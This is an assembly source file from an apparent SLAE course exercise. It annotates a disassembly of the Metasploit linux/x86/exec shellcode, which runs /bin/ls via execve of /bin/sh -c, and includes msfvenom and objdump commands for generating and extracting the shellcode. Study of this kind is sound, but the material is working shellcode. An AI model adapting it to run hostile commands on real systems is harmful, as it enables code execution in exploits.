; Filename:      linux_x86_exec.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  07.12.2018
; Note:          MSF: payload/linux/x86/exec
; Disassembler:  msfvenom -p linux/x86/exec CMD=/bin/ls -a x86 --platform linux -f raw | ndisasm -u - | cut -c 29-50
; Assembler:     nasm -f elf32 linux_x86_exec.nasm -o linux_x86_exec.o
; Linker:        ld -N -m elf_i386 linux_x86_exec.o -o linux_x86_exec
; Assembly dump: objdump -d ./linux_x86_exec|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

push byte +0xb                       ; 0x00000000b to stack
pop eax                              ; eax = 0xb = 11 = sys_execve
cdq                                  ; Convert Doubleword to Quadword (Clear edx register)
push edx                             ; Stack push 0x000000
push word 0x632d                     ; "c-" Read commands from the command_string operand instead of from the standard input.
mov edi,esp                          ; Save pointer to arg in edi
push dword 0x68732f                  ; "hs/"  "/bin/sh"
push dword 0x6e69622f                ; "nib/"
mov ebx,esp                          ; Save pointer to filename in ebx
push edx                             ; Stack push 0x000000
call 0x25                            ; Set EIP at the end of the string (7 Bytes) and push the return address to the stack
das                                  ; "/"
bound ebp,[ecx+0x6e]                 ; "bin"
das                                  ; "/"
insb                                 ; "l"
jnc 0x25                             ; "s" 00

; execve - execute program
; http://man7.org/linux/man-pages/man2/execve.2.html
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve("/bin/sh", "-c", char *const envp[]);

push edi                             ;
push ebx                             ;
mov ecx,esp                          ;
int 0x80                             ; syscal sys_execve
